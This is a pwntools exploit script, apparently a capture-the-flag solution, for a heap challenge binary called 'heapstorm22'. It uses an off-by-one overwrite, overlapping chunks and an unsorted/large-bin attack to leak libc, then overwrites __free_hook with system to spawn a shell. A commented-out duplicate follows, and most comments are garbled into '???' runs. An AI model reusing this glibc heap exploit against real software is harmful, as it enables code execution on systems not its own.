#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './heapstorm22'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('mand: ')

def create(size):
    eat()
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))

def edit(index, content):
    eat()
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Size: ')
    p.sendline(str(len(content)))
    p.recvuntil('Content:')
    p.send(content)

def delete(index):
    eat()
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(index))

def show(index):
    eat()
    p.sendline('4')
    p.recvuntil('Index: ')
    p.sendline(str(index))

while True:
    arch = 64
    challenge = './heapstorm22'

    context.os = 'linux'
    context.log_level = 'debug'
    if arch == 64:
        context.arch = 'amd64'
    if arch == 32:
        context.arch = 'i386'
    context.terminal = ['tmux', 'splitw', '-h']
    elf = ELF(challenge)
    libc = ELF('libc.so.6')

    local = 1
    if local:
        p = process(challenge)
    else:
        p = remote('chuj.top', '53178')

    create(0x18)# 0
    create(0x508)# 1
    create(0x18)# 2

    create(0x18)# 3
    create(0x508)# 4
    create(0x18)# 5

    create(0x18)# 6 ?????? 5 ??? top
    
    edit(1,0x4f0*b'a'+p64(0x500))# ?????? prve_size ??? 0x500
    
    delete(1)# ???????????? prev_size ??????
    
    edit(0,(0x18-12)*b'a')# off-by-one ?????? size ??? 0x500
    
    # 2 overlap 7????????? 7 ?????? 2
    create(0x18)# 1
    
    create(0x4d8)# 7 uaf overlap
    
    delete(1)# ??? prev_size ??? 0x20???????????? corrupted size vs. prev_size
    debug()
    delete(2)# unlink
    
    create(0x38)# 1
    create(0x4e0)# 2 0x4f0 unsorted
  
    # ? overlap 8????????? 8 ?????? free???
    edit(4,0x4f0*b'a'+p64(0x500))
    delete(4)# ???????????? prev_size ??????
    edit(3,(0x18-12)*b'a')

    create(0x18)# 4
    create(0x4d8)# 8 uaf overlap

    delete(4)
    delete(5)# unlink
    
    create(0x48)# 4
    # 0x4e0 large
    
    # ?????? large_bin ??? unsorted_bin
    delete(2)
    
    create(0x4e0)# 2
    delete(2)
    
    # ????????????
    evil = 0x13370800-0x10
    unsorted = p64(0)*2 + p64(0) + p64(0x4f1) + p64(0) + p64(evil) + p64(0) + p64(0)
    edit(7,unsorted) # unsorted ?????? bk

    large = p64(0)*4 + p64(0) + p64(0x4e1) + p64(0) + p64(evil+0x8) + p64(0) + p64(evil-0x20+8-5)
    edit(8,large) # large ?????? bk_nextsize bk
    
    # 0x133707f0
    try:
        create(0x48)  # 2 unsorted ??? fd ???????????? libc???large ??? bk ??? victim??????????????????????????? size
        
        payload = flat(
            0, 0,
            0, 0x13377331,  # ?????? show ?????????
            0x13370800, 0x70,
        )
        edit(2, payload)
        show(0)

        # leak_libc
        p.recvuntil(']: ')
        p.recvuntil('HEAPSTORM_II')
        libc.address = ((u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))) ^ 0x13370800) - 0x3c4b78
        log.success('libc.address: ' + hex(libc.address))

        system_addr = libc.sym['system']
        free_hook = libc.sym['__free_hook']
        log.success('free_hook: ' + hex(free_hook))

        payload = flat(
            0, 0,
            0, 0x13377331,  # ?????? show ?????????
            0x13370800, 0x50,
            free_hook, 0x8,
            '/bin/sh\x00', 0x8,
            0x13370840, 0x8
        )
        edit(0, payload)

        edit(1, p64(system_addr))

        delete(3)
    except EOFError:
        p.close()
        continue
    else:
        p.interactive()
        break
        




# #! /usr/bin/env python3
# from pwn import *
#
# arch = 64
# challenge = './heapstorm22'
#
# context.os='linux'
# context.log_level = 'debug'
# if arch==64:
#     context.arch='amd64'
# if arch==32:
#     context.arch='i386'
# context.terminal = ['tmux', 'splitw', '-h']
# elf = ELF(challenge)
# libc = ELF('libc.so.6')
#
# local = 1
# if local:
#     p = process(challenge)
# else:
#     p = remote('chuj.top', '53178')
#
#
# def debug():
#     gdb.attach(p)
#     pause()
#
# bps = []
# pie = 1
# def gdba():
#     if local == 0:
#         return 0
#     cmd ='set follow-fork-mode parent\n'
#     #cmd=''
#     if pie:
#         base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
#         cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
#         cmd += 'set $base={:#x}\n'.format(base)
#     else:
#         cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
#
#     gdb.attach(p,cmd)
#
# def eat():
#     p.recvuntil('mand: ')
#
# def create(size):
#     eat()
#     p.sendline('1')
#     p.recvuntil('Size: ')
#     p.sendline(str(size))
#
# def edit(index, content):
#     eat()
#     p.sendline('2')
#     p.recvuntil('Index: ')
#     p.sendline(str(index))
#     p.recvuntil('Size: ')
#     p.sendline(str(len(content)))
#     p.recvuntil('Content:')
#     p.send(content)
#
# def delete(index):
#     eat()
#     p.sendline('3')
#     p.recvuntil('Index: ')
#     p.sendline(str(index))
#
# def show(index):
#     eat()
#     p.sendline('4')
#     p.recvuntil('Index: ')
#     p.sendline(str(index))
#
#


# while True:
#     arch = 64
#     challenge = './heapstorm22'
#
#     context.os = 'linux'
#     context.log_level = 'debug'
#     if arch == 64:
#         context.arch = 'amd64'
#     if arch == 32:
#         context.arch = 'i386'
#     context.terminal = ['tmux', 'splitw', '-h']
#     elf = ELF(challenge)
#     libc = ELF('libc.so.6')
#
#     local = 1
#     if local:
#         p = process(challenge)
#     else:
#         p = remote('chuj.top', '53178')
#     # ???????????? overlap ??? unsorted ??? large
#     create(0x18)# 0
#     create(0x508)# 1
#     create(0x18)# 2
#
#     create(0x18)# 3
#     create(0x508)# 4
#     create(0x18)# 5
#
#     create(0x18)# 6 ???????????? ???unlink
#
#     edit(1,b'a'*0x4f0+p64(0x500))# fake_prev_size 0x500
#     delete(1)
#     edit(0,(0x18-12)*'a')# off-by-one 0x510->0x500 free ????????????????????? double
#
#     edit(4,b'a'*0x4f0+p64(0x500))# fake_prev_size 0x500
#     # delete(4)
#     # edit(3,(0x18-12)*'a')# off-by-one 0x510->0x500 free ????????????????????? double
#
#     # ?????? overlap 1 ??? 7
#     create(0x18)# 1
#     create(0x4d8)# 7
#
#     # unlink
#     delete(1) # ??? prev_size ??? 0x20???????????? corrupted size vs. prev_size
#     delete(2)
#
#     # overlap 1 ??? 7 ??????
#     create(0x38)# 1
#     create(0x4e8)# 2 0x4f0 unsorted
#
#
#     # ?????? overlap 4 ??? 8
#     delete(4)
#     edit(3,(0x18-12)*'a')# off-by-one 0x510->0x500 free ????????????????????? double
#
#     create(0x18)# 4
#     create(0x4d8)# 8 ???????????????????????? unsortbin ????????????
#
#     # unlink
#     delete(4)
#
#     delete(5)
#
#     # overlap 4 ??? 8 ??????
#     create(0x48)# 4 0x4e0 large
#
#     # ????????? bin
#     delete(2)
#     create(0x4e8)# 2
#     delete(2)
#
#     # ????????????
#     evil = 0x13370800-0x10
#     unsorted = p64(0)*2 + p64(0) + p64(0x4f1) + p64(0) + p64(evil) + p64(0) + p64(0)
#     edit(7,unsorted) # unsorted ?????? bk
#
#     large = p64(0)*4 + p64(0) + p64(0x4e1) + p64(0) + p64(evil+0x8) + p64(0) + p64(evil-0x20+8-5)
#     edit(8,large) # large ?????? bk_nextsize bk
#
#
#     # 0x133707f0
#     try:
#         create(0x48)  # 2 unsorted ??? fd ???????????? libc???large ??? bk ??? victim??????????????????????????? size
#         payload = flat(
#             0, 0,
#             0, 0x13377331,  # ?????? show ?????????
#             0x13370800, 0x70,
#         )
#         edit(2, payload)
#         show(0)
#
#         # leak_libc
#         p.recvuntil(']: ')
#         p.recvuntil('HEAPSTORM_II')
#         libc.address = ((u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))) ^ 0x13370800) - 0x3c4b78
#         log.success('libc.address: ' + hex(libc.address))
#
#         system_addr = libc.sym['system']
#         free_hook = libc.sym['__free_hook']
#         log.success('free_hook: ' + hex(free_hook))
#
#         payload = flat(
#             0, 0,
#             0, 0x13377331,  # ?????? show ?????????
#             0x13370800, 0x50,
#             free_hook, 0x8,
#             '/bin/sh\x00', 0x8,
#             0x13370840, 0x8
#         )
#         edit(0, payload)
#
#         edit(1, p64(system_addr))
#
#         delete(3)
#     except EOFError:
#         p.close()
#         continue
#     else:
#         p.interactive()
#         break